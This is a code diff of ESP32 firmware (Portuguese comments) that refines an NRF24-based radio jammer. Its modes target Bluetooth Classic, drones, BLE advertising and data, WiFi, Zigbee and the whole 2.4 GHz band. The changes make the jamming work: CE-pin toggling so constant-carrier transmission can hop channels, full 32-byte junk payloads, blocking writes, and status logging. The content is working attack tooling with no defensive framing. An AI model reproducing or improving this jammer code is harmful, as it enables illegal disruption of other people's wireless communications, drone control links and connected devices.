@@ -29,7 +29,7 @@
 // ── Canais ────────────────────────────────────────────
 static const uint8_t BT_CH[]  = {32,34,46,48,50,52,0,1,2,4,6,8,22,24,26,28,30,74,76,78,80};
 static const uint8_t BLE_CH[] = {2, 26, 80};
-static const char    JAM_TEXT[] = "xxxxxxxxxxxxxxxx";
+static const char    JAM_TEXT[] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
 
 // ── Objetos de rádio (alocados dinamicamente) ─────────
 // NRF24 usa HSPI (SPI2) — MESMO barramento do CC1101, mas DIFERENTE do TFT!
@@ -188,7 +188,7 @@ static bool nrfInit() {
     radio[i]->setAutoAck(false);
     radio[i]->stopListening();
     radio[i]->setRetries(0, 0);
-    radio[i]->setPayloadSize(5);
+    radio[i]->setPayloadSize(32);
     radio[i]->setAddressWidth(3);
     radio[i]->setPALevel(RF24_PA_MAX, true);
     radio[i]->setDataRate(RF24_2MBPS);
@@ -222,6 +222,19 @@ static void nrfDeinit() {
   nrfInitDone = false;
 }
 
+static void toggleCeLow() {
+  digitalWrite(NRF_CE, LOW);
+#if NRF2_ENABLED
+  digitalWrite(NRF2_CE, LOW);
+#endif
+}
+static void toggleCeHigh() {
+  digitalWrite(NRF_CE, HIGH);
+#if NRF2_ENABLED
+  digitalWrite(NRF2_CE, HIGH);
+#endif
+}
+
 // ─────────────────────────────────────────────────────
 //  Task FreeRTOS — loop de jamming
 // ─────────────────────────────────────────────────────
@@ -234,18 +247,23 @@ static void jamTask(void *param) {
 
     // ── 1: BT Jammer — portadora constante varrendo BT Classic
     case 1:
+      Serial.println("[NRF] Iniciando BT Jammer (Const Carrier)");
       for (int i = 0; i < radioCount; i++)
         radio[i]->startConstCarrier(RF24_PA_MAX, BT_CH[0]);
       while (!jamStop) {
         for (int ch = 0; ch < 21 && !jamStop; ch++) {
+          toggleCeLow(); // OBRIGATORIO: baixar CE para o PLL mudar de canal
           for (int i = 0; i < radioCount; i++)
             radio[i]->setChannel(BT_CH[ch]);
+          toggleCeHigh(); // Levanta CE para voltar a transmitir
           jamCurChan = BT_CH[ch];
           jamPktCount++;
-          vTaskDelay(1);
+          // Serial.printf("[NRF] BT Jammer -> Canal %d\n", jamCurChan); // Log desativado para não poluir
+          vTaskDelay(5);
         }
       }
       for (int i = 0; i < radioCount; i++) radio[i]->stopConstCarrier();
+      Serial.println("[NRF] BT Jammer Parado.");
       break;
 
     // ── 2: Drone Jammer — varrendo 0-124 aleatório + portadora
@@ -254,8 +272,10 @@ static void jamTask(void *param) {
         radio[i]->startConstCarrier(RF24_PA_MAX, 45);
       while (!jamStop) {
         uint8_t ch = (uint8_t)(random(125));
+        toggleCeLow();
         for (int i = 0; i < radioCount; i++)
           radio[i]->setChannel(ch);
+        toggleCeHigh();
         jamCurChan = ch;
         jamPktCount++;
         vTaskDelay(1);
@@ -263,19 +283,25 @@ static void jamTask(void *param) {
       for (int i = 0; i < radioCount; i++) radio[i]->stopConstCarrier();
       break;
 
-    // ── 3: BLE Adv Jammer — writeFast nos 3 canais ADV
+    // ── 3: BLE Adv Jammer — write nos 3 canais ADV
     case 3:
+      Serial.println("[NRF] Iniciando BLE Adv Jammer (Write)");
       while (!jamStop) {
         for (int ch = 0; ch < 3 && !jamStop; ch++) {
           for (int i = 0; i < radioCount; i++) {
             radio[i]->setChannel(BLE_CH[ch]);
-            radio[i]->writeFast(&JAM_TEXT, sizeof(JAM_TEXT));
+            // Substituido writeFast por write para garantir a subida do pino CE
+            bool ok = radio[i]->write(&JAM_TEXT, sizeof(JAM_TEXT));
+            if (jamPktCount % 100 == 0) { // Log a cada 100 envios para não travar
+               Serial.printf("[NRF] BLE Adv Jammer (Radio %d) -> Canal %d, Status TX: %s\n", i, BLE_CH[ch], ok ? "OK" : "FALHA");
+            }
           }
           jamCurChan = BLE_CH[ch];
           jamPktCount++;
         }
-        vTaskDelay(1);
+        vTaskDelay(5);
       }
+      Serial.println("[NRF] BLE Adv Jammer Parado.");
       break;
 
     // ── 4: BLE Data Jammer — portadora nos canais BLE data (2-80 pares)
@@ -284,8 +310,10 @@ static void jamTask(void *param) {
         radio[i]->startConstCarrier(RF24_PA_MAX, 45);
       while (!jamStop) {
         for (uint8_t ch = 2; ch <= 80 && !jamStop; ch += 2) {
+          toggleCeLow();
           for (int i = 0; i < radioCount; i++)
             radio[i]->setChannel(ch);
+          toggleCeHigh();
           jamCurChan = ch;
           jamPktCount++;
           vTaskDelay(1);
@@ -296,6 +324,7 @@ static void jamTask(void *param) {
 
     // ── 5: WiFi Jammer — todos os 14 canais WiFi (faixas de 23 sub-canais)
     case 5:
+      Serial.println("[NRF] Iniciando WiFi Jammer (Write)");
       while (!jamStop) {
         for (int wch = 0; wch < 14 && !jamStop; wch++) {
           int base = (wch * 5) + 1;
@@ -303,14 +332,18 @@ static void jamTask(void *param) {
             if (sub < 1 || sub > 125) continue;
             for (int i = 0; i < radioCount; i++) {
               radio[i]->setChannel((uint8_t)sub);
-              radio[i]->writeFast(&JAM_TEXT, sizeof(JAM_TEXT));
+              bool ok = radio[i]->write(&JAM_TEXT, sizeof(JAM_TEXT));
+              if (jamPktCount % 500 == 0) {
+                Serial.printf("[NRF] WiFi Jammer (Radio %d) -> WiFi CH %d (RF CH %d), Status TX: %s\n", i, wch+1, sub, ok ? "OK" : "FALHA");
+              }
             }
             jamCurChan = (uint8_t)sub;
             jamPktCount++;
           }
-          vTaskDelay(1);
+          vTaskDelay(2);
         }
       }
+      Serial.println("[NRF] WiFi Jammer Parado.");
       break;
 
     // ── 6: Zigbee Jammer — canais 11-26 IEEE 802.15.4 → NRF offset
@@ -321,7 +354,7 @@ static void jamTask(void *param) {
           for (int sub = 0; sub < 3 && !jamStop; sub++) {
             for (int i = 0; i < radioCount; i++) {
               radio[i]->setChannel(nrfCh + sub);
-              radio[i]->writeFast(&JAM_TEXT, sizeof(JAM_TEXT));
+              radio[i]->write(&JAM_TEXT, sizeof(JAM_TEXT));
             }
             jamCurChan = nrfCh + sub;
             jamPktCount++;
@@ -337,8 +370,10 @@ static void jamTask(void *param) {
         radio[i]->startConstCarrier(RF24_PA_MAX, 0);
       while (!jamStop) {
         for (uint8_t ch = 0; ch < 125 && !jamStop; ch++) {
+          toggleCeLow();
           for (int i = 0; i < radioCount; i++)
             radio[i]->setChannel(ch);
+          toggleCeHigh();
           jamCurChan = ch;
           jamPktCount++;
           vTaskDelay(1);
@@ -575,7 +610,7 @@ void handleModoNRF24() {
 
   // Debounce mais curto na tela de ataque (inicio/parada rapidos)
   // Menu de navegacao usa debounce global (200ms) — evita duplo clique
-  static const unsigned long NRF_ATK_DEBOUNCE = 80; // ms
+  static const unsigned long NRF_ATK_DEBOUNCE = 300; // ms
   unsigned long nrfDebounce = (nrfScreen == NSC_ATTACK) ? NRF_ATK_DEBOUNCE : debounceDelay;
   if ((millis() - lastDebounceTime) <= nrfDebounce) return;
 
